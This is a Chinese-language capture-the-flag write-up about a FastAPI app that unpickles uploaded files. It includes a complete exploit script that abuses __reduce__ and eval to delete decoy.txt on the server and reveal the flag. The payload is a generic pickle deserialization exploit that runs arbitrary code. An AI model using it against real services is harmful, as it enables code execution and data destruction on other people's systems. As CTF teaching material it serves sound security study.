# Writeup

## 1. 题目描述

题目为一个基于 FastAPI 实现的 web 应用，允许用户上传 `pickle` 文件并远程解析。页面显示提示内容：通过删除 `decoy.txt` 可使网页读取 `flag.txt` 中的内容并显示。用户需要利用 pickle 文件的特性，构造恶意载荷，通过反序列化漏洞删除 `decoy.txt` 文件，以获取正确的 flag。

## 2. 知识点

1. **Pickle 反序列化漏洞**：Pickle 是 Python 内置的序列化模块，允许将对象序列化为字节流。反序列化的对象数据如果不可控，则存在漏洞。
2. **`__reduce__` 方法**：Python 对象反序列化时会调用 `__reduce__`，可以控制行为。
3. **文件操作**：通过恶意代码实现对目标文件（`decoy.txt`）的删除。

## 3. 解题方法思路

### 关键路径与参数

1. 检查代码：
   - `pickle.loads()` 会直接加载用户上传的文件内容。
   - 利用 Pickle 反序列化漏洞，通过自定义类实现恶意操作。
2. 使用工具和方法：
   - 类的 `__reduce__` 方法可定义反序列化时的逻辑。
   - 使用 `os.remove()` 删除 `decoy.txt`，促使程序读取 `flag.txt`。

## 4. 解题步骤

### 步骤 1：分析代码结构

- 首页主视图函数：
  ```python
  if os.path.exists('decoy.txt'):
      flag = open('decoy.txt').read()
  else:
      flag = open('flag.txt').read()
  ```
  **判断条件**：若 `decoy.txt` 存在，则读取其内容；否则改为读取 `flag.txt`。
- 文件上传解析功能：
  ```python
  pickle.loads(await pickle_file.read())
  ```
  **漏洞来源**：直接对用户上传的 pickle 文件进行反序列化，没有验证。

### 步骤 2：编写 EXP

- 编写恶意类：

  ```python
  class MaliciousPayload:
      def __reduce__(self):
          code = "__import__('os').remove('decoy.txt')"
          return (eval, (code,))
  ```

  > **补充说明**：  
  > 这里使用的 `eval` 是 Python 的内置函数，无需额外 `import`，直接可用。这样可以避免调用其他库导致的报错或环境不一致问题。

- 一个完整的 EXP 文件如下：

  ```python
  import pickle

  class MaliciousPayload:
      def __reduce__(self):
          code = "__import__('os').remove('decoy.txt')"
          return (eval, (code,))

  def generate_pickle():
      payload = MaliciousPayload()

      with open('malicious.pickle', 'wb') as f:
          pickle.dump(payload, f)

      print("[+] 恶意 pickle 文件已生成: malicious.pickle")

  if __name__ == "__main__":
      generate_pickle()
  ```

  **功能说明**：

  - `__reduce__` 指定对象反序列化时执行 `os.remove('decoy.txt')`，从而删除 `decoy.txt` 文件。

### 步骤 3：访问目标站点上传分析

- 使用 EXP：
  1. 生成恶意 pickle 文件：
     ```
     python3 exp.py
     [+] 恶意 pickle 文件已生成: malicious.pickle
     ```
  2. 上传生成的 `malicious.pickle` 文件到目标网站。
  3. 刷新目标页面，触发删除 `decoy.txt`，读取 `flag.txt`。

## 5. EXP 和 Flag 获取

最终脚本：

```python
import pickle

class MaliciousPayload:
    def __reduce__(self):
        code = "__import__('os').remove('decoy.txt')"
        return (eval, (code,))

def generate_pickle():
    payload = MaliciousPayload()

    with open('malicious.pickle', 'wb') as f:
        pickle.dump(payload, f)

    print("[+] 恶意 pickle 文件已生成: malicious.pickle")

if __name__ == "__main__":
    generate_pickle()
```
